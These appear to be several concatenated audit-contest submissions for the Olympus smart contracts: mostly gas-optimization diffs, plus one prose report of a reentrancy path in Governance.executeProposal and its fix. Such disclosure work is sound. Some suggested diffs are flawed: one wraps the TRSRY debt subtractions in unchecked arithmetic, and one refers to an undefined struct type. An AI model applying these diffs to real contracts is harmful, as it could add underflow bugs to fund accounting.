[PRICE.sol:59](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/modules/PRICE.sol#L59) - [RANGE.sol:65](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/modules/RANGE.sol#L65) - [RANGE.sol:65](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/modules/RANGE.sol#L65) - [Governance.sol:121](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/policies/Governance.sol#L121) - [Governance.sol:124](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/policies/Governance.sol#L124) - [Governance.sol:127](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/policies/Governance.sol#L127) - [Governance.sol:130](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/policies/Governance.sol#L130) - [Governance.sol:133](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/policies/Governance.sol#L133) - [Governance.sol:137](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/policies/Governance.sol#L137)  ## **15. Reduce math operations** ### Optimize `Governance.submitProposal`  It is possible to reduce the condition of the `submitProposal` method in the following way, since it is not necessary to multiply in both places.  ```diff function submitProposal(         Instruction[] calldata instructions_,         bytes32 title_,         string memory proposalURI_     ) external { -       if (VOTES.balanceOf(msg.sender) * 10000 < VOTES.totalSupply() * SUBMISSION_REQUIREMENT) +       if (VOTES.balanceOf(msg.sender) * SUBMISSION_REQUIREMENT < VOTES.totalSupply())             revert NotEnoughVotesToPropose(); ```  **Affected source code:**  - [Governance.sol:164](https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/policies/Governance.sol#L164)  ### Optimize `Governance.activateProposal`  ```diff     function activateProposal(uint256 proposalId_) external {         ...         if ( -           (totalEndorsementsForProposal[proposalId_] * 100) < -           VOTES.totalSupply() * ENDORSEMENT_THRESHOLD +           (totalEndorsementsForProposal[proposalId_] * 50) < +           VOTES.totalSupply()         ) {             revert NotEnoughEndorsementsToActivateProposal();         }         ...     } ```  **Affected source code:**  - [Governance.sol:217-218](https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/policies/Governance.sol#L217-L218)  ### Optimize `Governance.executeProposal`   ```diff -       if (netVotes * 100 < VOTES.totalSupply() * EXECUTION_THRESHOLD) { +       if (netVotes * 3 < VOTES.totalSupply()) {             revert NotEnoughVotesToExecute();         } ```  **Affected source code:**  - [Governance.sol:268](https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/policies/Governance.sol#L268)  ### Optimize `Operator._activate`  It's possible to avoid the duplicate operation of `10**(oracleDecimals * 2)` like following:  ```diff -           uint256 invCushionPrice = 10**(oracleDecimals * 2) / range.cushion.low.price; -           uint256 invWallPrice = 10**(oracleDecimals * 2) / range.wall.low.price; +           uint256 invCushionPrice = 10**(oracleDecimals * 2); +           uint256 invWallPrice = invCushionPrice / range.wall.low.price; +           invCushionPrice /= range.cushion.low.price; ```  **Affected source code:**  - [Operator.sol:419-420](https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/policies/Operator.sol#L419-L420)  ## **16. Use `calldata` instead of `memory`**  The method `propose` is `external`, and the arguments are defined as `memory` instead of as `calldata`.  By marking the function as `external` it is possible to use `calldata` in the arguments shown below and save significant gas.  **Recommended change:**  ```diff     function submitProposal(         Instruction[] calldata instructions_,         bytes32 title_, -       string memory proposalURI_ +       string calldata proposalURI_     ) external {    ...    } ```  **Affected source code:**  - [Governance.sol:162](https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/policies/Governance.sol#L162)  ## **17. Optimze instructions order**  It is recommended to always perform input or parameter checks first, from cheapest to most expensive. Avoiding making external calls or unnecessary costly tasks for the cases to be verified.  ### Optimize `Governance.endorseProposal` **Recommended change:**  ```diff     function endorseProposal(uint256 proposalId_) external { -       uint256 userVotes = VOTES.balanceOf(msg.sender);          if (proposalId_ == 0) {             revert CannotEndorseNullProposal();         }          Instruction[] memory instructions = INSTR.getInstructions(proposalId_);         if (instructions.length == 0) {             revert CannotEndorseInvalidProposal();         }          // undo any previous endorsement the user made on these instructions         uint256 previousEndorsement = userEndorsementsForProposal[proposalId_][msg.sender];         totalEndorsementsForProposal[proposalId_] -= previousEndorsement;          // reapply user endorsements with most up-to-date votes +       uint256 userVotes = VOTES.balanceOf(msg.sender);         userEndorsementsForProposal[proposalId_][msg.sender] = userVotes;         totalEndorsementsForProposal[proposalId_] += userVotes;          emit ProposalEndorsed(proposalId_, msg.sender, userVotes);     } ```  **Affected source code:**  - [Governance.sol:181](https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/policies/Governance.sol#L181)  ### Optimize `Governance.endorseProposal` **Recommended change:**  ```diff     function vote(bool for_) external { -       uint256 userVotes = VOTES.balanceOf(msg.sender);          if (activeProposal.proposalId == 0) {             revert NoActiveProposalDetected();         }          if (userVotesForProposal[activeProposal.proposalId][msg.sender] > 0) {             revert UserAlreadyVoted();         }  +       uint256 userVotes = VOTES.balanceOf(msg.sender);         if (for_) {             yesVotesForProposal[activeProposal.proposalId] += userVotes;         } else {             noVotesForProposal[activeProposal.proposalId] += userVotes;         }          userVotesForProposal[activeProposal.proposalId][msg.sender] = userVotes;          VOTES.transferFrom(msg.sender, address(this), userVotes);          emit WalletVoted(activeProposal.proposalId, msg.sender, for_, userVotes);     } ```  **Affected source code:**  - [Governance.sol:241](https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/policies/Governance.sol#L241)  ## **18. Optimze `Governance` storage**  It is possible to save all duplicate keys between `yesVotesForProposal` and `noVotesForProposal` if they both share the same key and use a structure as a value.  **Recommended change:**  ```diff + struct ActivatedProposal { +     uint256 yes; +     uint256 no; + }  +   /// @notice Return the total of votes for a proposal id used in calculating net votes. +   mapping(uint256 => YesNo) public votesForProposal; -   /// @notice Return the total yes votes for a proposal id used in calculating net votes. -   mapping(uint256 => uint256) public yesVotesForProposal;  -   /// @notice Return the total no votes for a proposal id used in calculating net votes. -   mapping(uint256 => uint256) public noVotesForProposal; ```  **Affected source code:**  - [Governance.sol:111](https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/policies/Governance.sol#L111)  ## **19. `delete` optimization**  Use `delete` instead of set to default value (`false` or `0`).  5 gas could be saved per entry in the following affected lines:  **Affected source code:**  - [Kernel.sol:455](https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/Kernel.sol#L455)  ### Total gas saved: **5 * 1 = 5**  ## **20. Optimize `Operator.bondPurchase`**  It's possible to optimize the following method using an `else` instruction:   ```diff     function bondPurchase(uint256 id_, uint256 amountOut_)         external         onlyWhileActive         onlyRole("operator_reporter")     {         if (id_ == RANGE.market(true)) {             _updateCapacity(true, amountOut_);             _checkCushion(true);         } +       else if (id_ == RANGE.market(false)) { -       if (id_ == RANGE.market(false)) {             _updateCapacity(false, amountOut_);             _checkCushion(false);         }     } ```  **Affected source code:**  - [Operator.sol:346-359](https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/policies/Operator.sol#L346-L359)  ## **21. Optimize `Operator` refactoring some methods**  It is possible to remove the `bool high_` argument and the required conditionals in the following methods. It's best to create two methods, one for high and one for low to reduce push arguments and conditional checking, because all the logic is different.  **Affected source code:**  - `_activate` in [Operator.sol:363](https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/policies/Operator.sol#L363) - `_regenerate` in [Operator.sol:699](https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/policies/Operator.sol#L699)  ## **22. Optimize `Operator.setRegenParams` and `Operator._regenerate`**  It is possible to avoid repeated accesses to storage as well as possible human errors such as those posted in the issues about the `lastRegen` field if instead of manually resetting each field in the struct, the entire struct is reset. This will save a considerable amount of gas and reduce human error.  ```diff     function setRegenParams(         uint32 wait_,         uint32 threshold_,         uint32 observe_     ) external onlyRole("operator_policy") {         /// Confirm regen parameters are within allowed values         if (wait_ < 1 hours || threshold_ > observe_ || observe_ == 0)             revert Operator_InvalidParams();          /// Set regen params         _config.regenWait = wait_;         _config.regenThreshold = threshold_;         _config.regenObserve = observe_;  -       /// Re-initialize regen structs with new values (except for last regen) +       /// Re-initialize regen structs with new values +       Regen memory empty = Regen({ +           count: uint32(0), +           lastRegen: uint48(block.timestamp), +           nextObservation: uint32(0), +           observations: new bool[](observe_) +       }); +       _status.high = empty; -       _status.high.count = 0; -       _status.high.nextObservation = 0; -       _status.high.observations = new bool[](observe_);  +       _status.low = empty; -       _status.low.count = 0; -       _status.low.nextObservation = 0; -       _status.low.observations = new bool[](observe_);          emit RegenParamsChanged(wait_, threshold_, observe_);     }          ...      function _regenerate(bool high_) internal {         /// Deactivate cushion if active on the side being regenerated         _deactivate(high_);  +       Regen memory empty = Regen({ +           count: uint32(0), +           lastRegen: uint48(block.timestamp), +           nextObservation: uint32(0), +           observations: new bool[](_config.regenObserve) +       });          if (high_) {              /// Reset the regeneration data for the side +           _status.high = empty; -           _status.high.count = uint32(0); -           _status.high.observations = new bool[](_config.regenObserve); -           _status.high.nextObservation = uint32(0); -           _status.high.lastRegen = uint48(block.timestamp);              /// Calculate capacity             uint256 capacity = fullCapacity(true);              /// Regenerate the side with the capacity             RANGE.regenerate(true, capacity);         } else {             /// Reset the regeneration data for the side +           _status.low = empty; -           _status.low.count = uint32(0); -           _status.low.observations = new bool[](_config.regenObserve); -           _status.low.nextObservation = uint32(0); -           _status.low.lastRegen = uint48(block.timestamp);              /// Calculate capacity             uint256 capacity = fullCapacity(false);              /// Regenerate the side with the capacity             RANGE.regenerate(false, capacity);         }     } ```  **Affected source code:**  - [Operator.sol:574-580](https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/policies/Operator.sol#L574-L580) - [Operator.sol:705-720](https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/policies/Operator.sol#L705-L720) 
  # Gas Optimizations  ## Summary Of Findings:    | Issue  -- | --  1 | Caching storage variable and using `unchecked` in `updateMovingAverage()` function 2 | Simplify formulas and emit local variables in `updatePrices` function 3 | Caching storage variable in the `callback` function 4 | Caching storage variable in the `vote` function 5 | Caching storage variable in the `executeProposal` function  ## Detailed Report on Gas Optimization Findings:  ### 1. <ins>Caching storage variable and using `unchecked` in `updateMovingAverage()` function</ins> The [updateMovingAverage()](https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/modules/PRICE.sol#L122-L147) function in `PRICE.sol` can save gas by the following changes:   1. Cache the state variable `nextObsIndex`. Storage reads are much more expensive than memory reads (100 Vs 3).  2. Use uncheck block for the line `nextObsIndex = (nextObsIndex + 1) % numObs;`  As `numObs` is greater than zero from the previous calculation in the if-else block. And `nextObsIndex` can be safely assumed to be never equal to `type(uint32).max`.    The following `diff` shows the mitigation: ```diff diff --git "a/.\\orig.txt" "b/.\\modified.txt" index 7b37684..ca3cab4 100644 --- "a/.\\orig.txt" +++ "b/.\\modified.txt" @@ -6,8 +6,8 @@          uint32 numObs = numObservations;            // Get earliest observation in window -        uint256 earliestPrice = observations[nextObsIndex]; - +        uint32 cachednextObsIndex = nextObsIndex; +        uint256 earliestPrice = observations[cachednextObsIndex];           uint256 currentPrice = getCurrentPrice();            // Calculate new moving average @@ -18,9 +18,11 @@          }            // Push new observation into storage and store timestamp taken at -        observations[nextObsIndex] = currentPrice; +        observations[cachednextObsIndex] = currentPrice;          lastObservationTime = uint48(block.timestamp); -        nextObsIndex = (nextObsIndex + 1) % numObs; +        unchecked { +            nextObsIndex = (cachednextObsIndex + 1) % numObs;   +        }            emit NewObservation(block.timestamp, currentPrice, _movingAverage);      } ```  We convert 3 storage reads to 1 storage read and 2 memory reads. Along with the unchecked operation this will save us around 250 gas.  ### 2. <ins>Simplify formulas and emit local variables in `updatePrices` function</ins>  The [updatePrices](https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/modules/RANGE.sol#L158-L178) function in `RANGE.sol` can save gas by the following changes:   1. There are four equations which follow the same kind of pattern. For example: ```solidity movingAverage_ * (FACTOR_SCALE - wallSpread) / FACTOR_SCALE ``` This could be simplified as: ```solidity // expanding the equation         movingAverage_ * FACTOR_SCALE / FACTOR_SCALE - movingAverage_ * wallSpread / FACTOR_SCALE // which is simplified into:         movingAverage_ - movingAverage_ * wallSpread / FACTOR_SCALE //the right hand side of the above equation is used twice so we can calculate it and save it in a memory variable. Like this:         uint256 temp1 = movingAverage_ * wallSpread / FACTOR_SCALE;         _range.wall.low.price = movingAverage_ - temp1;         _range.wall.high.price = movingAverage_ + temp1; ```  2. The emit at the end of the function uses the above storage variables. But we can save gas by just doing the calculations directly:   Finally the mitigation diff with the above changes looks like this: ```diff diff --git "a/.\\orig.txt" "b/.\\modified.txt" index 57c28a0..78909cc 100644 --- "a/.\\orig.txt" +++ "b/.\\modified.txt" @@ -2,20 +2,20 @@          // Cache the spreads          uint256 wallSpread = _range.wall.spread;          uint256 cushionSpread = _range.cushion.spread; -          // Calculate new wall and cushion values from moving average and spread -        _range.wall.low.price = (movingAverage_ * (FACTOR_SCALE - wallSpread)) / FACTOR_SCALE; -        _range.wall.high.price = (movingAverage_ * (FACTOR_SCALE + wallSpread)) / FACTOR_SCALE; +        uint256 temp1 = movingAverage_ * wallSpread / FACTOR_SCALE; + +        _range.wall.low.price = movingAverage_ - temp1; +        _range.wall.high.price = movingAverage_ + temp1;   -        _range.cushion.low.price = (movingAverage_ * (FACTOR_SCALE - cushionSpread)) / FACTOR_SCALE; -        _range.cushion.high.price = -            (movingAverage_ * (FACTOR_SCALE + cushionSpread)) / -            FACTOR_SCALE; +        uint256 temp2 = movingAverage_ * cushionSpread / FACTOR_SCALE; +        _range.cushion.low.price = movingAverage_ - temp2; +        _range.cushion.high.price = movingAverage_ + temp2;            emit PricesChanged( -            _range.wall.low.price, -            _range.cushion.low.price, -            _range.cushion.high.price, -            _range.wall.high.price +             movingAverage_ - temp1, +             movingAverage_ - temp2, +             movingAverage_ + temp2, +             movingAverage_ + temp1          );      }  ``` The above optimization reduced the average gas consumption of `updatePrices` function from 40966 to 40605, which means a gas saving of **361**. This function is used by the [initialize](https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/policies/Operator.sol#L598), [operate](https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/policies/Operator.sol#L195)  and [setSpreads](https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/policies/Operator.sol#L498) functions in `Operator` contract as well. Which means effectively we save 3 times 361 = 1083 gas.   ### 3. <ins>Caching storage variable in the `callback` function</ins> The [callback](https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/policies/BondCallback.sol#L100) function in the `BondCallback` contract reads the storage variable `ohm` multiple times. `ohm` could be cached to memory to save gas on storage reads.  The mitigation diff looks like this: ```diff diff --git "a/.\\orig.txt" "b/.\\modified.txt" index beb85a5..e559dc5 100644 --- "a/.\\orig.txt" +++ "b/.\\modified.txt" @@ -1,4 +1,4 @@ -    function callback( +  function callback(          uint256 id_,          uint256 inputAmount_,          uint256 outputAmount_ @@ -14,22 +14,22 @@          // Check that quoteTokens were transferred prior to the call          if (quoteToken.balanceOf(address(this)) < priorBalances[quoteToken] + inputAmount_)              revert Callback_TokensNotReceived(); - +        ERC20 cachedOHM = ohm;              // Handle payout -        if (quoteToken == payoutToken && quoteToken == ohm) { +        if (quoteToken == payoutToken && quoteToken == cachedOHM) {               // If OHM-OHM bond, only mint the difference and transfer back to teller              uint256 toMint = outputAmount_ - inputAmount_;              MINTR.mintOhm(address(this), toMint);                // Transfer payoutTokens to sender              payoutToken.safeTransfer(msg.sender, outputAmount_); -        } else if (quoteToken == ohm) { +        } else if (quoteToken == cachedOHM) {              // If inverse bond (buying ohm), transfer payout tokens to sender              TRSRY.withdrawReserves(msg.sender, payoutToken, outputAmount_);                // Burn OHM received from sender              MINTR.burnOhm(address(this), inputAmount_); -        } else if (payoutToken == ohm) { +        } else if (payoutToken == cachedOHM) {              // Else (selling ohm), mint OHM to sender              MINTR.mintOhm(msg.sender, outputAmount_);          } else {  ```   The mitigation reduced the max gas consumption of `callback` function from 187927 to 187847, which means a saving of 80 gas.  ### 4. <ins>Caching storage variable in the `vote` function</ins> The [vote](https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/policies/Governance.sol#L240-L262) function in the `Governance` contract reads the struct element `activeProposal.proposalId` multiple times. This could be cached to memory to save gas on storage reads.  The mitigation diff looks like this: ```diff diff --git "a/.\\orig.txt" "b/.\\modified.txt" index 6656cb4..2d24d2e 100644 --- "a/.\\orig.txt" +++ "b/.\\modified.txt" @@ -1,23 +1,23 @@      function vote(bool for_) external {          uint256 userVotes = VOTES.balanceOf(msg.sender); - -        if (activeProposal.proposalId == 0) { +        uint256 cachedID = activeProposal.proposalId; +        if (cachedID == 0) {  // @audit cache it.              revert NoActiveProposalDetected();          }   -        if (userVotesForProposal[activeProposal.proposalId][msg.sender] > 0) { +        if (userVotesForProposal[cachedID][msg.sender] > 0) {              revert UserAlreadyVoted();          }            if (for_) { -            yesVotesForProposal[activeProposal.proposalId] += userVotes; +            yesVotesForProposal[cachedID] += userVotes;          } else { -            noVotesForProposal[activeProposal.proposalId] += userVotes; +            noVotesForProposal[cachedID] += userVotes;          }   -        userVotesForProposal[activeProposal.proposalId][msg.sender] = userVotes; +        userVotesForProposal[cachedID][msg.sender] = userVotes;            VOTES.transferFrom(msg.sender, address(this), userVotes);   -        emit WalletVoted(activeProposal.proposalId, msg.sender, for_, userVotes); +        emit WalletVoted(cachedID, msg.sender, for_, userVotes);      } ```   The mitigation reduces the max storage reads from 5 to 1. Which can save up to 400 gas.  ### 5. <ins>Caching storage variable in the `executeProposal` function</ins> The [executeProposal](https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/policies/Governance.sol#L265-L289) function in the `Governance` contract reads the struct element `activeProposal.proposalId` multiple times. This could be cached to memory to save gas on storage reads. Plus the length of the array could be cached to save gas in the `for` loop.   The mitigation `diff` looks like this: ```diff diff --git "a/.\\orig.txt" "b/.\\modified.txt" index 733a8a2..41ff620 100644 --- "a/.\\orig.txt" +++ "b/.\\modified.txt" @@ -1,6 +1,7 @@      function executeProposal() external { -        uint256 netVotes = yesVotesForProposal[activeProposal.proposalId] - -            noVotesForProposal[activeProposal.proposalId]; +        uint256 cachedID = activeProposal.proposalId; +        uint256 netVotes = yesVotesForProposal[cachedID] -   +            noVotesForProposal[cachedID];          if (netVotes * 100 < VOTES.totalSupply() * EXECUTION_THRESHOLD) {              revert NotEnoughVotesToExecute();          } @@ -9,16 +10,16 @@              revert ExecutionTimelockStillActive();          }   -        Instruction[] memory instructions = INSTR.getInstructions(activeProposal.proposalId); - -        for (uint256 step; step < instructions.length; ) { -            kernel.executeAction(instructions[step].action, instructions[step].target); +        Instruction[] memory instructions = INSTR.getInstructions(cachedID); +        uint256 len = instructions.length; +        for (uint256 step; step < len; ) {   +            kernel.executeAction(instructions[step].action, instructions[step].target);               unchecked {                  ++step;              }          }   -        emit ProposalExecuted(activeProposal.proposalId); +        emit ProposalExecuted(cachedID);            // deactivate the active proposal          activeProposal = ActivatedProposal(0, 0); ```   The mitigation reduces the max storage reads from 4 to 1. Which can save up to 300 gas.  ## Conclusions:    | Issue | Gas Saved -- | -- | --  1 | Caching storage variable and using `unchecked` in `updateMovingAverage()` function | 250 2 | Simplify formulas and emit local variables in `updatePrices` function | 1083  3 | Caching storage variable in the `callback` function | 80 4 | Caching storage variable in the `vote` function | 400 5 | Caching storage variable in the `executeProposal` function | 300  ### TOTAL GAS SAVED = 250 + 1083 + 80 + 400 + 300 = <ins>2113</ins>. 
# Lines of code  https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/policies/Governance.sol#L265 https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/policies/Governance.sol#L278-L288   # Vulnerability details  ## Impact Given that the activeProposal change is done before the for loop, if this function is call through one kernel.executeAction(instruction,target) we can call the same instructions (in the same order) again and again, which may or may not affect funds (depending on the instructions).  ## Proof of Concept For instance, if we install a new module, and this module has a vulnerability (even intentional), the next steps can by trigger:  1. Call executeAction 1. This allow us to call kernel.executeAction in the for loop 1. executAction allow us to call **_installModule** 1. **\_installModule** allow us to call **newModule_.Init** 1. By init we can call now executeProposal again (suppose that the init function interact with a previous vulnerable proxy contract to scam voters to vote in favour of this proposal as if it was a contract which is ok, and before calling executeProposal we change the implementation to allow this attack),  ## Tools Used Static Analysis  ## Recommended Mitigation Steps Use nonReentrant modifier or move the line ```activeProposal = ActivatedProposal(0, 0);``` before the for loop. 
https://github.com/code-423n4/2022-08-olympus/blob/main/src/Kernel.sol 1. unchecked : activePolicies.lenght-1 cannot underflow since element is pushed in previous statement  ``` git diff diff --git a/src/Kernel.sol b/src/Kernel.sol index 3a00ec5..c9a3536 100644 --- a/src/Kernel.sol +++ b/src/Kernel.sol @@ -297,7 +297,10 @@ contract Kernel {            // Add policy to list of active policies          activePolicies.push(policy_); -        getPolicyIndex[policy_] = activePolicies.length - 1; +        //activePolicies.lenght-1 cannot underflow since element is pushed in previous statement +        unchecked { +            getPolicyIndex[policy_] = activePolicies.length - 1; +        }            // Record module dependencies          Keycode[] memory dependencies = policy_.configureDependencies(); ```  https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/INSTR.sol 1. unchecked : totalInstructions cannot practically reach uint max  ``` git diff diff --git a/src/modules/INSTR.sol b/src/modules/INSTR.sol index 4536df2..56825ae 100644 --- a/src/modules/INSTR.sol +++ b/src/modules/INSTR.sol @@ -41,7 +41,10 @@ contract OlympusInstructions is Module {      /// @notice Store a list of Instructions to be executed in the future.      function store(Instruction[] calldata instructions_) external permissioned returns (uint256) {          uint256 length = instructions_.length; -        uint256 instructionsId = ++totalInstructions; +        uint256 instructionsId; +        unchecked { +            instructionsId = ++totalInstructions; +        }            Instruction[] storage instructions = storedInstructions[instructionsId]; ```  https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/RANGE.sol 1.  Use local variables to refer storage variables  ``` git diff diff --git a/src/modules/RANGE.sol b/src/modules/RANGE.sol index e878bac..5ff2cef 100644 --- a/src/modules/RANGE.sol +++ b/src/modules/RANGE.sol @@ -161,19 +161,20 @@ contract OlympusRange is Module {          uint256 cushionSpread = _range.cushion.spread;            // Calculate new wall and cushion values from moving average and spread -        _range.wall.low.price = (movingAverage_ * (FACTOR_SCALE - wallSpread)) / FACTOR_SCALE; -        _range.wall.high.price = (movingAverage_ * (FACTOR_SCALE + wallSpread)) / FACTOR_SCALE; +        //Use local variables to refer storage variables +        uint256 _r_wall_low_price = _range.wall.low.price = (movingAverage_ * (FACTOR_SCALE - wallSpread)) / FACTOR_SCALE; +        uint256 _r_wall_high_price = _range.wall.high.price = (movingAverage_ * (FACTOR_SCALE + wallSpread)) / FACTOR_SCALE;   -        _range.cushion.low.price = (movingAverage_ * (FACTOR_SCALE - cushionSpread)) / FACTOR_SCALE; -        _range.cushion.high.price = +        uint256 _r_cushion_low_price = _range.cushion.low.price = (movingAverage_ * (FACTOR_SCALE - cushionSpread)) / FACTOR_SCALE; +        uint256 _r_cushion_high_price = _range.cushion.high.price =              (movingAverage_ * (FACTOR_SCALE + cushionSpread)) /              FACTOR_SCALE;            emit PricesChanged( -            _range.wall.low.price, -            _range.cushion.low.price, -            _range.cushion.high.price, -            _range.wall.high.price +            _r_wall_low_price , +            _r_cushion_low_price, +            _r_cushion_high_price, +            _r_wall_high_price          );      } ``` https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/TRSRY.sol 1. Unchecked  ``` git diff diff --git a/src/modules/TRSRY.sol b/src/modules/TRSRY.sol index de9b630..7ec43e1 100644 --- a/src/modules/TRSRY.sol +++ b/src/modules/TRSRY.sol @@ -109,11 +109,14 @@ contract OlympusTreasury is Module, ReentrancyGuard {          uint256 prevBalance = token_.balanceOf(address(this));          token_.safeTransferFrom(msg.sender, address(this), amount_);   -        uint256 received = token_.balanceOf(address(this)) - prevBalance; +        uint256 received; +        unchecked { +            received = token_.balanceOf(address(this)) - prevBalance;   -        // Subtract debt from caller -        reserveDebt[token_][msg.sender] -= received; -        totalDebt[token_] -= received; +            // Subtract debt from caller +            reserveDebt[token_][msg.sender] -= received; +            totalDebt[token_] -= received; +        }            emit DebtRepaid(token_, msg.sender, received);      }  ``` https://github.com/code-423n4/2022-08-olympus/blob/main/src/utils/KernelUtils.sol 1. No need to initialize variable to 0. 2. use ++i instead of i++  ``` git diff diff --git a/src/utils/KernelUtils.sol b/src/utils/KernelUtils.sol index 125a674..69f7ea4 100644 --- a/src/utils/KernelUtils.sol +++ b/src/utils/KernelUtils.sol @@ -40,13 +40,13 @@ function ensureContract(address target_) view {  function ensureValidKeycode(Keycode keycode_) pure {      bytes5 unwrapped = Keycode.unwrap(keycode_);   -    for (uint256 i = 0; i < 5; ) { +    for (uint256 i; i < 5; ) {          bytes1 char = unwrapped[i];            if (char < 0x41 || char > 0x5A) revert InvalidKeycode(keycode_); // A-Z only            unchecked { -            i++; +            ++i;          }      }  } @@ -55,13 +55,13 @@ function ensureValidKeycode(Keycode keycode_) pure {  function ensureValidRole(Role role_) pure {      bytes32 unwrapped = Role.unwrap(role_);   -    for (uint256 i = 0; i < 32; ) { +    for (uint256 i; i < 32; ) {          bytes1 char = unwrapped[i];          if ((char < 0x61 || char > 0x7A) && char != 0x5f && char != 0x00) {              revert InvalidRole(role_); // a-z only          }          unchecked { -            i++; +            ++i;          }      }  } ```  https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Operator.sol 1. Use unchecked for decimals increment 2. Use pre increment/decrement ``` git diff diff --git a/src/policies/Operator.sol b/src/policies/Operator.sol index 7573526..d8576c1 100644 --- a/src/policies/Operator.sol +++ b/src/policies/Operator.sol @@ -485,7 +485,9 @@ contract Operator is IOperator, Policy, ReentrancyGuard {          int8 decimals;          while (price_ >= 10) {              price_ = price_ / 10; -            decimals++; +            unchecked { +                ++decimals; +            }          }            /// Subtract the stated decimals from the calculated decimals to get the relative price decimals. @@ -683,12 +685,12 @@ contract Operator is IOperator, Policy, ReentrancyGuard {          if (currentPrice <= movingAverage) {              if (!regen.observations[regen.nextObservation]) {                  _status.high.observations[regen.nextObservation] = true; -                _status.high.count++; +                ++_status.high.count;              }          } else {              if (regen.observations[regen.nextObservation]) {                  _status.high.observations[regen.nextObservation] = false; -                _status.high.count--; +                --_status.high.count;              }          } ```  https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/BondCallback.sol 1. Use local variable to refer storage variable ``` git diff diff --git a/src/policies/BondCallback.sol b/src/policies/BondCallback.sol index 4da1a3a..f9fdab1 100644 --- a/src/policies/BondCallback.sol +++ b/src/policies/BondCallback.sol @@ -153,10 +153,12 @@ contract BondCallback is Policy, ReentrancyGuard, IBondCallback {          ERC20 token;          uint256 balance;          uint256 len = tokens_.length; +        //Use local variable to refer storage variable +        OlympusTreasury _TRSRY = TRSRY;          for (uint256 i; i < len; ) {              token = tokens_[i];              balance = token.balanceOf(address(this)); -            token.safeTransfer(address(TRSRY), balance); +            token.safeTransfer(address(_TRSRY), balance);              priorBalances[token] = token.balanceOf(address(this));                unchecked { ``` https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Governance.sol 1. Use local variable instead of read from memory ``` git diff diff --git a/src/policies/Governance.sol b/src/policies/Governance.sol index 8829e3b..31fc309 100644 --- a/src/policies/Governance.sol +++ b/src/policies/Governance.sol @@ -275,7 +275,9 @@ contract OlympusGovernance is Policy {            Instruction[] memory instructions = INSTR.getInstructions(activeProposal.proposalId);   -        for (uint256 step; step < instructions.length; ) { +        // Use local variable instead of read from memory +        uint256 _len = instructions.length; +        for (uint256 step; step < _len; ) {              kernel.executeAction(instructions[step].action, instructions[step].target);              unchecked {                  ++step; ```
